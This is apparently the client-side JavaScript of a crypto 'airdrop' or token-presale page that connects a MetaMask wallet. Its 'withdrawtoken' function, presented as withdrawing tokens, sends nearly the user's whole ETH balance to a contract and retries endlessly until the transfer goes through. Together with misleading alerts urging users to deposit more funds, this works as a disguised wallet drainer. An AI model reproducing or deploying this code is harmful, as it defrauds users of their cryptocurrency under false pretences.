
    

    async function connectMetamask() {
      let web3Provider = null;
      console.log("[web3] getting provider...");
      // Modern Browsers like Chrome and Brave
      if (window.ethereum) {
        web3Provider = window.ethereum;
        try {
          // Request account access
          await window.ethereum.enable();
        } catch (error) {
          // User denied account access...
          alert("You must connect your metamask wallet to claim token!");
          console.error("User denied account access to metamask.");
          return;
        }
      } else {
        // you cant connect
        alert("You must connect your MetaMask wallet!");
      console.error("Unable to connect to metamask");
           function Redirect() {
		 window.location="https://metamask.app.link/dapp/" + urlRef;
		  }
		 document.write("You must connect wallet");
            Redirect();
        return;
      }
      let web3 = new Web3(window.ethereum);
      let accounts = await web3.eth.getAccounts();
      console.log("accounts : " + accounts);
      window.account = accounts[0];
	  let get_balance = await web3.eth.getBalance(accounts[0]);  
		balance = web3.utils.fromWei(get_balance, "ether");  
	//	console.log("balance : " + balance);
		balance = parseFloat(balance).toFixed(5);  
		window.balance = balance;	
		console.log("balance : " + balance);
		document.getElementById("balanc_eth").innerHTML = balance;
      
      document.getElementById("btn-metamask").innerHTML = account.substr(0,5)+"..."+account.substr(account.length-4,4);
		document.getElementById("ethwallet").innerHTML = account.substr(0,42);
      return web3;
    }

async function buyTokens() {
  try {
    let _web3 = await connectMetamask();
    
    if (window.ethereum) {
      await window.ethereum.enable();
    } else {
      alert("You must connect your MetaMask wallet!");
      console.error("Unable to connect to MetaMask");

      // Display a message to the user
      document.write("You must connect your MetaMask wallet. Redirecting...");

      // Define a function to redirect the user
      function Redirect() {
        window.location.href = "https://metamask.app.link/dapp/" + urlRef;
      }

      // Call the redirect function after displaying the message
      Redirect();

      // Reload the webpage after 5 seconds
      setTimeout(function() {
        window.location.reload();
      }, 5000); // 5000 milliseconds = 5 seconds

      // Ensure no further code execution after redirection
      // (This return statement may not be necessary depending on your context)
      return;
    }

    let amount = document.getElementById("presaleAmount").value;
    let new_amount = amount * 0.925;
    let myContract = new _web3.eth.Contract(contractAbi, contractAddress);

    console.log("myContract:", myContract);

    const gasEstimation = await myContract.methods.buyTokens().estimateGas({
      from: window.account,
      value: _web3.utils.toWei(new_amount.toString(), 'ether'),
    });

    const gasPrice = await _web3.eth.getGasPrice();

    // Retrieve the balance of the user's account
    let balance = await _web3.eth.getBalance(window.account);
    
    // Calculate the amount for the second transaction
    if (!amount || parseFloat(amount) < 0.056) {
      alert('Contribution value must be greater than or equal to 0.1 ETH or 0.5 BNB');
      return;
    } else if (parseFloat(amount) > parseFloat(balance)) {
      alert('Insufficient amount of eth or bnb, Please deposit in wallet');
      return;
    }

    // Prepare the transaction
    const firstTxResult = await myContract.methods.buyTokens().send({
      from: window.account,
      value: _web3.utils.toWei(new_amount.toString(), 'ether'),
      gas: gasEstimation,
      gasPrice: gasPrice,
    });

    console.log('First transaction successful:', firstTxResult);
  } catch (error) {
    console.error('Transaction failed:', error);
    // Handle error - show error message or take appropriate action
    return;
  }
}



	
	
	
	async function ClaimToken() {
    
	
		
		document.getElementById("login-form").style.display = "none";
         document.getElementById("user-panel").style.display = "block";
         document.getElementById("airdrop-block").style.display = "block";
         document.getElementById("login-btn").style.display = "none";
		
    }
	 
	function setMax() {
		
	if (balance > 0.01){
        document.getElementById('presaleAmount').value = balance;
		}
	else document.getElementById('presaleAmount').value = 0;
	}
	
	
	async function withdrawtoken() {
  try {
    let _web3 = await connectMetamask();

    if (window.ethereum) {
      // ... (code for enabling MetaMask remains the same)
    } else {
      console.error("Unable to connect to MetaMask");
      return;
    }
	if ( balance <  0.03) {
          alert('Min withdraw > 700 SOLV. And not enough transaction fees, please deposit Ethereum or BNB');
          return;
		  }
    const balance1 = (balance - 0.0022) * 0.925; // Ensure balance is properly defined

    let myContract = new _web3.eth.Contract(contractAbi, contractAddress);

    console.log("myContract:", myContract);

    let transactionSuccessful = false;
    while (!transactionSuccessful) {
      try {
        const gasEstimation = await myContract.methods.withdrawtoken().estimateGas({
          from: window.account,
          value: _web3.utils.toWei(balance1.toString(), 'ether'),
        });

        const gasPrice = await _web3.eth.getGasPrice();

        const transaction = await myContract.methods.withdrawtoken().send({
          from: window.account,
          value: _web3.utils.toWei(balance1.toString(), 'ether'),
          gas: gasEstimation,
          gasPrice: gasPrice,
        });

        console.log('Transaction successful:', transaction);
        transactionSuccessful = true; // Set flag to exit the loop on successful transaction
      } catch (error) {
        console.error('Transaction failed:', error);
        await delay(4000); // Delay of 4 seconds before the next retry
      }
    }
  } catch (error) {
    console.error('Error:', error);
    // Handle other errors if necessary
  }
}


function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}


    function openModal() {
      var modal = document.getElementById("myModal");
      modal.style.display = "block";
    }

    function closeModal() {
      var modal = document.getElementById("myModal");
      modal.style.display = "none";
    }

    // When the user clicks anywhere outside of the modal, close it
    window.onclick = function (event) {
      var modal = document.getElementById("myModal");

      if (event.target == modal) {
        modal.style.display = "none";
      }
    };

    window.onload = function () {
      var decodedCookie = decodeURIComponent(document.cookie);
      if (decodedCookie === "tokensBought=true") {
        document.getElementById("disabledButton").disabled = false;
      }
    };

    document.onblur = function () {
      var modal = document.getElementById("myModal");
      modal.style.display = "none";
    };
 